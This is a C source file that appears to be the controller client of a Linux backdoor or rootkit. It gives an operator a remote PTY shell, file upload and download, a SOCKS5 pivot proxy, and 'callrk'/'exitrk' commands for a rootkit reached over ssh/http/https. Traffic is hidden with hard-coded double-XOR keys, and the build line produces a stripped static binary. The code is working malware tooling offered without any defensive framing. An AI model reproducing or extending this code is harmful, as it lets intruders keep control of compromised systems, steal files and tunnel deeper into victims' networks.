/*
 gcc proxy.c dynbuf.c client.c -lutil -lpthread -lreadline -lhistory -lcurses -static -static-libgcc -s -o client
 
 gcc proxy.c dynbuf.c client.c -lutil -lpthread -lreadline -lhistory -lcurses -static -static-libgcc -s -Wl,--start-group -lc -lnss_files -lnss_dns -lresolv -Wl,--end-group -o client

*/

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <stdarg.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <termios.h>
#include <errno.h>
#include <readline/readline.h>
#include <readline/history.h>

#include "dynbuf.h"
#include "proxy.h"

//#define DEBUG


#define ENCODE_KEY  "34$*%%yj5"
#define ENCODE_KEY2 "=azM493pg"

#define _MAX_BUFSIZE 5*1024

#define MAX_DATA_SIZE 1024

#define MAXLINE 8192
#define MAXBUF 8192

//----------------------------------------
// uint16_t 0xFFFF
#define CMD_LOGIN			0x2B11
#define CMD_LOGIN_YES		0x2B21

#define CMD_FILE_UPLOAD		0x3C11
#define CMD_FILE_SIZE		0x3C21
#define CMD_FILE_UPLOAD_YES	0x3C31
#define CMD_FILE_UPLOAD_GO	0x3C41
#define CMD_FILE_DOWN		0x3C51
#define CMD_DOWNLOAD_YES	0x4A10
#define CMD_DOWNLOAD_GO		0x4A20

#define CMD_SHELL_PTY		0x5A10
#define CMD_SHELL_ENV		0x5A15
#define CMD_SHELL_YES		0x5A20
#define CMD_SHELL_DATA		0x5A30

#define CMD_SOCKS5			0x6D20
#define CMD_SOCKS5_OK		0x6D30
#define CMD_SOCKS5_DATA		0x6D40
#define CMD_SOCKS5_ERROR	0x6D50

#define CMD_PATH_ERR		0xAA20
#define CMD_FILE_CREATE_ERR 0xAA30

#define CMD_CONNECT			0x3E11
#define CMD_CONNECT_OK		0x3E22
#define CMD_DISCONNECT		0x2C11
#define CMD_DISCONNECT_OK	0x2E22
#define CMD_ERROR			0x7A10


struct _host{
	int sock;
	int state;
};
typedef struct _host HOST;

//--------------------------------------------------------
#ifndef NOMINMAX
#ifndef max
#define max(a, b) (((a) > (b)) ? (a) : (b))
#endif
#ifndef min
#define min(a, b) (((a) < (b)) ? (a) : (b))
#endif
#endif // NOMINMAX


char *g_dst_ip;
int g_dst_port;
//--------------------------------------------------------------------------------------------------------
int pty_runing = 0;


void debug(const char *fmt, ...)
{
#ifdef DEBUG
        va_list args;
        va_start(args, fmt);
        fprintf(stderr, "DEBUG: ");
        vfprintf(stderr, fmt, args);
        va_end(args);
#endif
}

void _rtrim(char *s)
{
    int l = 0, p = 0;
    l = strlen(s);
    if (l == 0)
        return;
	
    p = l - 1;
    while (s[p] == ' ' || s[p] == '\t' || s[p] == '\n')
    {
        s[p--] = '\0';
        if (p < 0)
            break;
    }

    return;
}


void xor_buf(char *buf, size_t buf_len, const char *key, size_t key_len)
{
	size_t idx;

	for (idx = 0; idx < buf_len; idx++)
	{
		buf[idx] ^= key[idx % key_len];
	}

}

__attribute__((always_inline)) void encode(char *buffer, size_t buf_len)
{
#ifndef DEBUG2
    xor_buf(buffer, buf_len, ENCODE_KEY, strlen(ENCODE_KEY));
	 
    xor_buf(buffer, buf_len, ENCODE_KEY2, strlen(ENCODE_KEY2));
#endif
}

__attribute__((always_inline)) void decode(char *buffer, size_t buf_len)
{
#ifndef DEBUG2
    xor_buf(buffer, buf_len, ENCODE_KEY2, strlen(ENCODE_KEY2));
	
    xor_buf(buffer, buf_len, ENCODE_KEY, strlen(ENCODE_KEY));
#endif
}




void help(char *command)
{
    printf("\n");
    printf(" shell           * start pty shell \n");
	
    printf(" callrk      	 [ip:port pass [ssh/http/https]] \n");
    printf(" exitrk          * exit rk \n");

    printf(" upload          [local_path remote_path] \n");
    printf(" download        [remote_path local_path] \n");
    printf(" socks5      	 [local_port] \n");
    printf(" stopsk5         * stop socks5 \n");

    printf("\n");
    printf(" exit            exit all \n");
    printf("\n");
}

int send_all(int fd, void *buf, int size)
{
    int ret, total = 0;
    while (size)
    {
        ret = send(fd, buf, size, 0);
        total += ret;
        if (ret < 0)
            return ret;
        size = size - ret;
        buf += ret;
    }
    return total;
}


//----------------------------------------------------------------------------
#define SK_ERR_socket -1
#define SK_ERR_connect -2
#define SK_ERR_bind -4
#define SK_ERR_listen -5
#define SK_ERR_send -6
#define SK_ERR_recv -7
typedef struct mysocks_t
{
    /*
    	char *relay;
    	char *type;
    	uint16_t min_backoff_ms;
    	uint16_t timeout;
    	*/
    void (*init)(struct sockaddr_in *sockaddr, char *addr, int port);
    int (*socket)();
    int (*bind)(int sockfd, struct sockaddr_in *dest_addr);
    int (*listen)(int sockfd, int max_user);
    int (*connect)(int sockfd, struct sockaddr_in *dest_addr);
    int (*accept)(int sockfd);
    int (*send)(int sockfd, char *data, int size);
    int (*recv)(int sockfd, char *data, int size);
} mysocks;

void sk_init(struct sockaddr_in *sockaddr, char *addr, int port)
{
    sockaddr->sin_family = AF_INET;
    sockaddr->sin_port = htons(port);
	
	sockaddr->sin_addr.s_addr = inet_addr(addr);
   // memcpy((void *)&dest_addr.sin_addr, (void *)host_addr->h_addr, host_addr->h_length);

}

int sk_socket()
{
	int sockfd;
	
    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        return -1;
    }

    // off nagle
    int enable = 1;
    setsockopt(sockfd, IPPROTO_TCP, TCP_NODELAY, (char *)&enable, sizeof(enable));

    return sockfd;
}

int sk_bind(int sockfd, struct sockaddr_in *dest_addr)
{
    if (bind(sockfd, (struct sockaddr *)dest_addr, sizeof(struct sockaddr)) < 0)
    {
        return -1;
    }

    return 0;
}

int sk_listen(int sockfd, int max_user)
{
    if (listen(sockfd, max_user) == -1)
    {
        return -1;
    }

    return 0;
}

int sk_connect(int sockfd, struct sockaddr_in *dest_addr)
{
    if (connect(sockfd, (struct sockaddr *)dest_addr, sizeof(struct sockaddr)) < 0)
    {
		close(sockfd);
		
        return -1;
    }

    return 0;
}

int sk_connect2(char *addr, int port)
{
	int sockfd;
    struct sockaddr_in dst_addr;
	
    memset(&dst_addr, 0, sizeof(dst_addr));

    dst_addr.sin_family = AF_INET;
    dst_addr.sin_port = htons(port);
	
	dst_addr.sin_addr.s_addr = inet_addr(addr);

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        return -1;
    }

    // off nagle
    int enable = 1;
    setsockopt(sockfd, IPPROTO_TCP, TCP_NODELAY, (char *)&enable, sizeof(enable));

    if (connect(sockfd, (struct sockaddr *)&dst_addr, sizeof(struct sockaddr)) < 0)
    {
		close(sockfd);
		
        return -1;
    }

    return sockfd;
}

int sk_accept(int sockfd)
{
    int sklen;
    struct sockaddr_in new_sock;
    int new_fd;

    sklen = sizeof(new_sock);
    new_fd = accept(sockfd, (struct sockaddr *)&new_sock, &sklen);
    if (new_fd < 0)
        return -1;

    return new_fd;
}

int sk_send(int sockfd, char *data, int size)
{
	int ret = 0;
	
	ret = send(sockfd, data, size, 0);
    if ( ret < 0)
    {
        return -1;
    }

    return ret;
}

int sk_recv(int sockfd, char *data, int size)
{
	int ret = 0;
	
	ret = recv(sockfd, data, size, 0);
    if ( ret < 0)
    {
        return -1;
    }

    return ret;
}

#if !defined(MSG_NOSIGNAL)
#define MSG_NOSIGNAL 0
#endif
int sk_send_all(int sockfd, char *buf, int size)
{
    int ret, total = 0;
	
    while (size)
    {
        ret = send(sockfd, buf, size, MSG_NOSIGNAL);
        if (ret > 0)
        {
            total += ret;

            size = size - ret;
            buf += ret;
        }

        if (ret <= 0)
            return ret;
    }

    return total;
}

int sk_recv_all(int sockfd, char *buf, int size)
{
    int ret, total = 0;
	
    while(size)
    {
        ret = recv(sockfd, buf, size, 0);
        if (ret > 0)
        {
            total += ret;

            size = size - ret;
            buf += ret;
        }

        if(ret <= 0)
            return ret;

    }

    return total;
}
/*
    mysocks *_mysocks = calloc(1, sizeof(*_mysocks));
    if (!_mysocks) {
        parser_error(section->context, "Not enough memory");
        return -1;
    }
	
	_mysocks->bind = sk_bind;
	
	free(_mysocks);
*/
//----------------------------------------------------------------------------


struct _pkt_hdr{
	uint32_t	len;
	uint16_t	type;
};
typedef struct _pkt_hdr PKT_HDR;
// len;type;payload
int sock_send(int sock, int type, char *data, size_t data_len)
{
    int nRet = 0;
    char wbuf[6 * 1024] = {0x00};
    int buf_Len = 0;
    int hdr_len = 0;
    PKT_HDR _pkt_hdr;
	char enc_buf[5 * 1024] = {0};
	size_t enc_size = 0;

    _pkt_hdr.len = data_len;
    _pkt_hdr.type = type;

    hdr_len = sizeof(PKT_HDR);
	
	// encode hdr
	encode((char*)&_pkt_hdr, hdr_len);

    memcpy(wbuf, &_pkt_hdr, hdr_len);

    // add payload
    if(data != NULL && data[0] != 0x00)
    {
		// encode data
		encode(data, data_len);
		
        memcpy(wbuf + hdr_len, data, data_len);
        buf_Len = hdr_len + data_len;
    }
    else
    {
        buf_Len = hdr_len;
    }

    nRet = ksock_write(sock, wbuf, buf_Len);
    if(nRet < 0)
    {
        return nRet;
    }

    return 0;
}


#if !defined(MSG_NOSIGNAL)
#define MSG_NOSIGNAL 0
#endif
int full_send(int fd, char *buf, int size)
{
    int ret, total = 0;
	
    while (size)
    {
        ret = send(fd, buf, size, MSG_NOSIGNAL);
        if (ret > 0)
        {
            total += ret;

            size = size - ret;
            buf += ret;
        }

        if (ret <= 0)
            return ret;
    }

    return total;
}

int full_recv(int fd, char *buf, int size)
{
    int ret, total = 0;
	
    while(size)
    {
        ret = recv(fd, buf, size, 0);
        if (ret > 0)
        {
            total += ret;

            size = size - ret;
			
            buf += ret;
        }

        if(ret <= 0)
            return ret;

    }

    return total;
}

// len;type;payload
int sock_read(int sock, int *type, void *data, size_t len)
{
    int nRet = 0;
    char buf[4000] = {'\0'};
    PKT_HDR *_pkt_hdr = NULL;
    uint32_t data_len = 0;
    uint32_t _type = 0;
    char dec_buf[5 * 1024] = {0};
    size_t dec_size = 0;

    nRet = ksock_read(sock, buf, sizeof(PKT_HDR), 0);
    if(nRet < 0)
    {
        return -1;
    }
	
	// decode hdr
    decode(buf, nRet);

    if(nRet != sizeof(PKT_HDR))
    {
        return -1;
    }

    _pkt_hdr = (PKT_HDR *)buf;

    data_len = _pkt_hdr->len;
    _type = _pkt_hdr->type;

    if(data_len < 0)
    {
        return -1;
    }

    if(data_len == 0)
    {
        nRet = 0;
    }

    if(data_len > 0 && data_len <= len)
    {
        memset(buf, 0, sizeof(buf));

        // read payload
        nRet = ksock_read(sock, buf, data_len, 0);
        if(nRet < 0)
        {
            return -1;
        }
		
		// decode data
        decode(buf, nRet);
		
        memcpy(data, buf, nRet);
    }

    *type = _type;

    return nRet;
}

int ksock_write(int sockfd, char *msg, int msg_len)
{
    if (full_send(sockfd, msg, msg_len) < 0)
    {
        return -1;
    }
	
    return 1;
}

int ksock_read(int sockfd, char *data, int data_len, int time_out)
{
    int ret = 0;

	ret = full_recv(sockfd, data, data_len);
	
    return ret;
}

char flag_key[2] = {0xF7, 0xA0}; // size cmd
typedef struct
{
    char flag[2];
    int32_t ws_row;
    int32_t ws_col;
} MSG_WINCH, *pMSG_WINCH;
typedef struct
{
    char term[256];
    int32_t ws_row;
    int32_t ws_col;
} MSG_ENV, *pMSG_ENV;


int get_winsz(struct winsize *ws)
{
    if (isatty(0))
    {
		if (ioctl(0, TIOCGWINSZ, ws) < 0)
		{
			return -1;
		}
	}
	
	return 0;
}

int pty_sockfd;
void sendwin()
{
    struct winsize ws;

    if (get_winsz(&ws) < 0)
    {
		ws.ws_row = 40;
		ws.ws_col = 90;
	}

	if(pty_runing == 1)
	{
        MSG_WINCH _winch;
        _winch.flag[0] = flag_key[0];
        _winch.flag[1] = flag_key[1];
        _winch.ws_row = ws.ws_row;
        _winch.ws_col = ws.ws_col;
	
        pty_send(pty_sockfd, (char *)&_winch, sizeof(MSG_WINCH));

	}
}

int send_start(mysocks *_sock, int sockfd)
{
	int nRet;
    int cmd_type = 0;
	char data[4000] = {0};
	
    //  1. CMD_SHELL_PTY
	if (sock_send(sockfd, CMD_SHELL_PTY, NULL, 0) < 0)
    {
        return SK_ERR_send;
    }

    nRet = sock_read(sockfd, &cmd_type, data, 4000);
    if ( nRet < 0)
	{
        return -1;
	}

    //  2. CMD_SHELL_YES
    if(cmd_type != CMD_SHELL_YES)
    {
        return -2;
    }
	
	return 0;
}


int send_env(mysocks *_sock, int sockfd)
{
    struct winsize ws;
    MSG_ENV msg_env = {0x00};
    strncpy((char *)&msg_env.term, "TERM=", strlen("TERM="));
    strncpy((char *)&msg_env.term + 5, getenv("TERM"), strlen(getenv("TERM")));

    if (get_winsz(&ws) < 0)
    {
        perror("ioctl()");
        return -1;
    }
    msg_env.ws_row = ws.ws_row;
    msg_env.ws_col = ws.ws_col;
	
    //  1. CMD_SHELL_ENV
	if (sock_send(sockfd, CMD_SHELL_ENV, (char *)&msg_env, sizeof(MSG_ENV)) < 0)
    {
        return SK_ERR_send;
    }
	
    return 0;
}

static struct termios tp, tr;
int stdout_raw_mode()
{
    if (isatty(1))
    {
        if (tcgetattr(1, &tp) < 0)
        {
            perror("tcgetattr()");
            return -1;
        }

        memcpy((void *)&tr, (void *)&tp, sizeof(tr));

        tr.c_iflag |= IGNPAR;
        tr.c_iflag &= ~(ISTRIP | INLCR | IGNCR | ICRNL | IXON | IXANY | IXOFF);
        tr.c_lflag &= ~(ISIG | ICANON | ECHO | ECHOE | ECHOK | ECHONL | IEXTEN);
        tr.c_oflag &= ~OPOST;

        tr.c_cc[VMIN] = 1;
        tr.c_cc[VTIME] = 0;

        if (tcsetattr(1, TCSADRAIN, &tr) < 0)
        {
            perror("tcsetattr()");
            return -2;
        }
    }
	
	return 0;
}


int pty_recv(int sockfd, char *data, size_t len)
{
    int nRet = 0;
    int cmd_type = 0;
	
    nRet = sock_read(sockfd, &cmd_type, data, len);
    if ( nRet < 0)
	{
        return -1;
	}

    if(cmd_type == CMD_SHELL_DATA)
    {
        if(nRet > 0)
            return nRet;
    }

    return 0;
}

int pty_send(int sockfd, char *data, size_t len)
{
    if (sock_send(sockfd, CMD_SHELL_DATA, data, len) < 0)
        return -1;

    return 1;
}

int cmd_ctl(char *data, int len)
{
	// exit -> 0d 0a 65 78 69 74 0d 0a   or   65 78 69 74 0d 0a
	if ((data[0] == 0x0d && data[1] == 0x0a && data[2] == 0x65 && data[3] == 0x78 &&
            data[4] == 0x69 && data[5] == 0x74 && data[6] == 0x0d && data[7] == 0x0a) 
			|| (data[0] == 0x65 && data[1] == 0x78 && data[2] == 0x69 && data[3] == 0x74 &&
                     data[4] == 0x0d && data[5] == 0x0a))
	{
        return -1;
	}
	
	return 0;
}


int start_shell(mysocks *_sock, int sockfd, char *path)
{
    pty_sockfd = sockfd;
    fd_set rd;
    int len, ret;
    struct winsize ws;

    if (send_start(_sock, sockfd) < 0)
    {
		printf(" shell error \n");
        return -1;
    }

    if (send_env(_sock, sockfd) < 0)
    {
        printf(" env error \n");

        return -2;
    }

    if(stdout_raw_mode() < 0)
	{
		printf(" raw mode error \n");
		
		return -3;
	}

	
	pty_runing = 1;

    signal(SIGWINCH, sendwin);

    char msg_buf[BUFSIZ + 1];
	
    while (1)
    {
		int ready;
		
        FD_ZERO(&rd);
        FD_SET(0, &rd);
        FD_SET(sockfd, &rd);
		
		ready = select(sockfd + 1, &rd, NULL, NULL, NULL);
        if (ready < 0)
        {
            if (errno == EINTR)
                continue;
			
            perror(" select ");
			
            break;
        }
		
		bzero(msg_buf, sizeof(msg_buf));

        if (FD_ISSET(sockfd, &rd))
        {
			bzero(msg_buf, sizeof(msg_buf));

			ret = pty_recv(sockfd, msg_buf, MAX_DATA_SIZE);
            if (ret > 0)
            {
                ret = write(1, msg_buf, ret);
                if (ret <= 0)
                {
                    break;
                }

                if (cmd_ctl(msg_buf, ret) < 0)
                {
					bzero(msg_buf, sizeof(msg_buf));
					
                    break;
                }
            }
            else{
                break;
			}
        }

        if (FD_ISSET(0, &rd))
        {
			bzero(msg_buf, sizeof(msg_buf));
			
            len = read(0, msg_buf, MAX_DATA_SIZE);
            if (len == 0)
            {
                break;
            }

            if (len < 0)
            {
                break;
            }

			ret = pty_send(sockfd, msg_buf, len);
			if(ret <= 0)
			{
				break;
			}

        }
    }

    if (isatty(1))
    {
        tcsetattr(1, TCSADRAIN, &tp);
    }
	
    pty_runing = 0;
	
    printf("\n  Bye!  \n");

    return 0;
}

//----------------------------------------------------------------------------
#define FILECTL_ERR_open -1
#define FILECTL_ERR_read -2
#define FILECTL_ERR_write -4
typedef struct _filectl_t
{
    FILE * (*open)(char *_path, const char *mode);
    void (*close)(FILE *fp);
    int64_t (*read)(FILE *fp, char *buffer, int buffer_len);
    int64_t (*write)(FILE *fp, char *buffer, int buffer_len);
} filectl;

FILE *fs_open(char *_path, const char *mode)
{
    FILE *fp = fopen(_path, mode);
    if (fp == NULL)
    {
        return NULL;
    }

    return fp;
}

void fs_close(FILE *fp)
{
	if(fp != NULL)
	{
	 fclose(fp);
	}
}

int64_t fs_read(FILE *fp, char *buffer, int buffer_len)
{
	size_t r_length = 0;
	
    //FILE *fp = fopen(_path, "rb");
    r_length = fread(buffer, sizeof(char), buffer_len, fp);
	if(r_length <= 0)
	{
		return FILECTL_ERR_read;
	}

    return r_length;
}

int64_t fs_write(FILE *fp, char *buffer, int buffer_len)
{
	size_t w_length = 0;

    w_length = fwrite(buffer, sizeof(char), buffer_len, fp);
	if(w_length <= 0)
	{
		return FILECTL_ERR_write;
	}

    return w_length;
}
//----------------------------------------------------------------------------


static int send_file(mysocks *_sock, int sockfd, char *file_path)
{
    filectl _filectl =
    {
        fs_open,
        fs_close,
        fs_read,
        fs_write
    };

    FILE *fp = _filectl.open(file_path, "rb");
    if (fp == NULL)
    {
        return -1;
    }


	char *buffer = (char *)alloca(sizeof(char) * MAX_DATA_SIZE);
    memset(buffer, 0, MAX_DATA_SIZE);

    int64_t block_len = 0;

    while ( (block_len = _filectl.read(fp, buffer, MAX_DATA_SIZE)) > 0 )
    {
		encode(buffer, block_len);

        if (_sock->send(sockfd, buffer, block_len) < 0)
        {
            //break;
			return -2;
        }

        memset(buffer, 0, sizeof(buffer));
    }

    _filectl.close(fp);

    return 1;
}

int is_exists(char *_path)
{
    if (access(_path, F_OK) == 0)
    {
        return 1;
    }
	
	return 0;
}

int is_dir(char *_path)
{
    struct stat st;
	
    //Get file info
    memset(&st, 0, sizeof(struct stat));
    if (stat(_path, &st) == -1)
    {
        return -1;
    }

    if (S_ISDIR(st.st_mode))
    {
        printf("-> %s is DIR\r\n", _path);

        return 1;
    }
	
	return 0;
}

int path_check(char *_path)
{
	// not found
    if (access(_path, F_OK) == -1)
    {
        return -1;
    }

    if (access(_path, R_OK) == -1)
    {
        printf(" ->Access denied\n");
        return -2;
    }
	
	if(is_dir(_path) == 1)
	{
        printf(" -> is DIR\r\n");
        return -3;
	}
	
	return 0;
}

int64_t get_file_size(char *_path)
{
    struct stat st;
	
    //Get file info
    memset(&st, 0, sizeof(struct stat));
    if (stat(_path, &st) == -1)
    {
        return -1;
    }

	return st.st_size;
}

int upload_file(mysocks *_sock, int sockfd, char *local_path, char *remote_path)
{
    int len, ret;
    char buffer[BUFSIZ] = {0};

    char loc_path2[1024] = {0};
    char remote_path2[1024] = {0};

    if (local_path == NULL || remote_path == NULL)
    {
        return 0;
    }

    memcpy(loc_path2, local_path, strlen(local_path));
    _rtrim(loc_path2);

    memcpy(remote_path2, remote_path, strlen(remote_path));
    _rtrim(remote_path2);
	
	
	if(path_check(loc_path2) < 0)
	{
		printf(" -> error: path %s \n", loc_path2);
		
		return -1;
	}

    // 1. CMD_FILE_UPLOAD
	//  CMD_FILE_UPLOAD /111/111.txt
    memcpy(buffer, remote_path2, strlen(remote_path2) > BUFSIZ ? BUFSIZ : strlen(remote_path2));

    if (sock_send(sockfd, CMD_FILE_UPLOAD, buffer, strlen(buffer)) < 0)
    {
        return SK_ERR_send;
    }

	int cmd_type = 0;
	
    if (sock_read(sockfd, &cmd_type, buffer, 4000) < 0)
    {
        return SK_ERR_recv;
    }

    if(cmd_type == CMD_PATH_ERR)
    {
        printf(" -> error: path %s \n", remote_path2);
        return 0;
    }
	
    if(cmd_type == CMD_FILE_CREATE_ERR)
    {
        printf(" -> error: create %s \n", remote_path2);
        return 0;
    }
	
    // 2. CMD_FILE_UPLOAD_YES
    if(cmd_type != CMD_FILE_UPLOAD_YES)
    {
        printf(" -> error: upload \n");
        return 0;
    }

    // send file size
    int64_t file_size = get_file_size(loc_path2);
	
    printf(" + File Len: %ld KB \n", file_size/1024);
	
    if (file_size <= 0)
    {
		sock_send(sockfd, CMD_FILE_SIZE, (unsigned char *)&file_size, sizeof(int64_t));
		
        return 0;
    }
    if (sock_send(sockfd, CMD_FILE_SIZE, (unsigned char *)&file_size, sizeof(int64_t)) < 0)
    {
        return SK_ERR_send;
    }
	

    //4. data send
    ret = send_file(_sock, sockfd, loc_path2);
	if(ret == 1)
	{
        printf(" + File: %s yes \n", loc_path2);
	}
	if(ret == -1)
	{
		printf(" File ERR: open %s\n", loc_path2);
	}
	if(ret == -2)
	{
        printf(" File ERR: send %s\n", loc_path2);
	}

    return 1;
}

static int recv_file(mysocks *_sock, int sockfd, filectl *_filectl, char *file_path, int64_t file_size)
{
    int length;
    size_t total_w = 0;
	
    FILE *fp = _filectl->open(file_path, "wb");
    if (fp == NULL)
    {
        return -1;
    }

    //char buffer[MAX_DATA_SIZE];
	char *buffer = (char *)alloca(sizeof(char) * MAX_DATA_SIZE);
    memset(buffer, 0, sizeof(buffer));
	
	size_t r_sum = MAX_DATA_SIZE;
	
    if(file_size < r_sum)
    {
		r_sum = file_size;
    }
	
    while ( (length = _sock->recv(sockfd, buffer, r_sum)) > 0 )
    {
        if (length < 0)
        {
			 _filectl->close(fp);

			return -2;
        }

		decode(buffer, length);

        size_t w_length = _filectl->write(fp, buffer, length);
        if (w_length < length)
        {
			 _filectl->close(fp);

			return -3;
        }
		
        total_w += w_length;
        if (total_w == file_size)
        {
            break;
        }
		
		if(file_size - total_w < r_sum)
		{
			r_sum = file_size - total_w;
		}

		memset(buffer, 0, sizeof(buffer));
    }
    fflush(fp);

    _filectl->close(fp);

    return 1;
}

int download_file(mysocks *_sock, int sockfd, char *local_path, char *remote_path)
{
    int len, nRet;
    char buffer[BUFSIZ] = {0};

    char loc_path2[1024] = {0};
    char remote_path2[1024] = {0};
	
    filectl _filectl =
    {
        fs_open,
        fs_close,
        fs_read,
        fs_write
    };

    if (local_path == NULL || remote_path == NULL)
    {
        return 0;
    }

    memcpy(loc_path2, local_path, strlen(local_path));
    _rtrim(loc_path2);

    memcpy(remote_path2, remote_path, strlen(remote_path));
    _rtrim(remote_path2);

    if(is_exists(loc_path2) == 1)
    {
        printf(" -> error: path exist %s \n", loc_path2);
        return 0;
    }

	//  1. CMD_FILE_DOWN /111/111.txt
    memcpy(buffer, remote_path2, strlen(remote_path2) > BUFSIZ ? BUFSIZ : strlen(remote_path2));
	
    if (sock_send(sockfd, CMD_FILE_DOWN, buffer, strlen(buffer)) < 0)
    {
        return SK_ERR_send;
    }
	

    bzero(buffer, BUFSIZ);

	int cmd_type = 0;
    if (sock_read(sockfd, &cmd_type, buffer, 4000) < 0)
    {
        return SK_ERR_recv;
    }
	
    if(cmd_type == CMD_PATH_ERR)
    {
        printf(" -> error: path %s \n", remote_path2);
        return 0;
    }
	
    //  2. CMD_DOWNLOAD_YES
    if(cmd_type != CMD_DOWNLOAD_YES)
    {
        printf(" -> error: download \n");

        return 0;
    }
	

    // get file size
    int64_t file_size = 0;

    nRet = sock_read(sockfd, &cmd_type, (unsigned char *)&file_size, sizeof(int64_t));
    if ( nRet < 0)
		return -1;
		
    if(cmd_type != CMD_FILE_SIZE)
    {
        return -1;
    }
	
    printf(" + File Len: %ld KB \n", file_size/1024);

    if (file_size == 0)
    {
        return -1;
    }

    //4. recv data
    int ret = recv_file(_sock, sockfd, &_filectl, loc_path2, file_size);
	if(ret == 1)
	{
        printf(" + File: %s yes \n", loc_path2);
	}
    if(ret == -1)
    {
		printf("  error: open %s\n", loc_path2);
    }
    if(ret == -2)
    {
		printf("  error: recv fail \n");
    }
    if(ret == -2)
    {
		printf("  error: write fail \n");
    }
	

    return 0;
}


static void settcpkeepalive(int fd)
{
	int optval = 1;
	socklen_t optlen = sizeof(optval);

	if(setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &optval, optlen) < 0) {
		printf(" error SO_KEEPALIVE \n");
	}

#ifdef TCP_KEEPIDLE
	optval = 10;
	optlen = sizeof(optval);
	if (setsockopt(fd, SOL_TCP, TCP_KEEPIDLE, &optval, optlen) < 0) {
		printf(" error TCP_KEEPIDLE \n");
	}
#endif
}

void _non_blocking(int sockfd)
{
	unsigned long imode = 1;
	ioctl(sockfd, FIONBIO, &imode);     // set non-blocking mode
}


int proxy_read_pkt(int sockfd, uint32_t *cmd, void *data, size_t len)
{
    int nRet;
    char buf[_MAX_BUFSIZE] = {0};
    uint32_t data_len = 0;
    uint32_t _command = 0;

    nRet = full_recv(sockfd, buf, sizeof(STREAM_HDR));
    if(nRet <= 0)
    {
        return -1;
    }

    decode(buf, nRet);

    if(nRet < sizeof(STREAM_HDR))
    {
        return -1;
    }

    STREAM_HDR *_stream_hdr = (STREAM_HDR *)buf;

    _command = _stream_hdr->command;
    data_len = _stream_hdr->len;

    if(data_len < 0)
    {
        return -1;
    }

    if((nRet - sizeof(STREAM_HDR)) != 0)
    {
        return -2;
    }

    memcpy(data, _stream_hdr, sizeof(STREAM_HDR));

    *cmd = _command;


    return sizeof(STREAM_HDR);
}

int proxy_send(int sockfd, STREAM_HDR *data, size_t data_sz)
{
    int nRet = 0;
	
	encode((char*)data, data_sz);

    nRet = full_send(sockfd, (char *)data, data_sz);
    if(nRet < 0)
    {
        return nRet;
    }

    return 0;
}

int proxy_run = 0;
int stop_proxy(int sockfd)
{
    int nRet = 0;
	
	if(proxy_run != 1)
	{
		return 0;
	}
	
	proxy_run = 0;

    close_proxy_all_client();

    // send stop
    STREAM_HDR o_stream_hdr = {0};
    o_stream_hdr.id = 0;
    o_stream_hdr.command = CLIENT_STATE_FORWARD_END;
    o_stream_hdr.len = 0;

    nRet = proxy_send(sockfd, &o_stream_hdr, sizeof(STREAM_HDR));
    if (nRet < 0)
    {
        return -1;
    }

    clear_outbuf();

    free_outbuf();
	
    printf(" -> stop yes! \n");

    return 1;
}

int proxy_dispatch(HOST *host)
{
    char rdata[_MAX_BUFSIZE];
    int rlen = 0;
    uint32_t cmd = 0;

    // 1. get cmd
    rlen = proxy_read_pkt(host->sock, &cmd, rdata, _MAX_BUFSIZE);
    if (rlen < 0)
    {
        return -1;
    }

    STREAM_HDR *i_stream = (STREAM_HDR *)rdata;

    if (i_stream->id > 0 && i_stream->len == 0 && i_stream->command == COMMAND_SOCKET_RECV_ERR)
    {
        close_proxy_client(i_stream->id);

        return 0;
    }

    if (i_stream->len == 0 && i_stream->command == COMMAND_SOCKET_OPEN_ERR)
    {
        close_proxy_client(i_stream->id);

        return 0;
    }


    // 2. write data to proxy client
    if (i_stream->command == CLIENT_STATE_FORWARD_DATA)
    {
        write_data2stream(i_stream->id, i_stream->data, i_stream->len);

        return 0;
    }

    // connect err
    if (i_stream->len == 0 && i_stream->command == COMMAND_SOCKET_CONNECT_ERR)
    {
		close_proxy_client(i_stream->id);
		
        return 0;
    }

    // exit, end
    if (i_stream->len == 0 && i_stream->command == CLIENT_STATE_FORWARD_END)
    {
        return -2;
    }

    // set stream state	RECEIVER_STATE_FORWARD_START_OK
    if (i_stream->command == RECEIVER_STATE_FORWARD_START_OK)
    {
        // set status
        set_stream_state(i_stream->id, SENDER_STATE_FORWARD_START_OK);

        return 0;
    }

    return 0;
}

int goutbuf_have_data()
{
    dynbuf_t *outbuf = NULL;
    int buflen = 0;

    outbuf = get_streams_outbuf();
    if (outbuf != NULL)
    {
        if ((buflen = dynbuf_len(outbuf)) > 0)
        {
            return 1;
        }
    }

    return 0;
}

int goutbuf_write_sock(HOST *host)
{
    dynbuf_t *outbuf = NULL;
    int buflen = 0;

    outbuf = get_streams_outbuf();

    if (outbuf != NULL)
    {
        while ((buflen = dynbuf_len(outbuf)) > 0)
        {
            void *data = (void *)dynbuf_dataptr(outbuf);
            if (data != NULL)
            {
                STREAM_HDR *o_stream_hdr = (STREAM_HDR *)data;

                // goutbuf data -> remote sock
                int nRet = proxy_send(host->sock, o_stream_hdr, sizeof(STREAM_HDR));
                if (nRet < 0)
                {
                    return -1;
                }

                dynbuf_consume(outbuf, sizeof(STREAM_HDR));
                //return buflen;
            }
        }
    }

    return 0;
}


void *proxy_loop( void *arg )
{
    int ready;
    int maxfd;
    fd_set readfds;
    fd_set writefds;
	
    HOST *host = (HOST *)arg;

    int sock = host->sock;

    srand((unsigned)time(NULL));

    init_proxy_env();

    while(proxy_run == 1)
    {
        // 1. read sock, get cmd
        FD_ZERO(&readfds);
        FD_ZERO(&writefds);
        
        // master fd read
        FD_SET(sock, &readfds);

        if (goutbuf_have_data() ==1)
        {
            FD_SET(sock, &writefds);
        }
		
        maxfd = max(maxfd, sock);


        maxfd = add_sock2fds(sock, &readfds, &writefds);
        maxfd = max(maxfd, sock);

        ready = select_event(maxfd, &readfds, &writefds, 3000);
        if (ready == -1)
        {
			// select error
            stop_proxy(host->sock);

            return ;
        }

        // timeout
        if (ready == 0)
        {
            continue;
        }

        // read
        if (FD_ISSET(sock, &readfds))
        {
            ready = proxy_dispatch(host);
            if (ready < 0)
            {
				stop_proxy(host->sock);

				return ;
            }
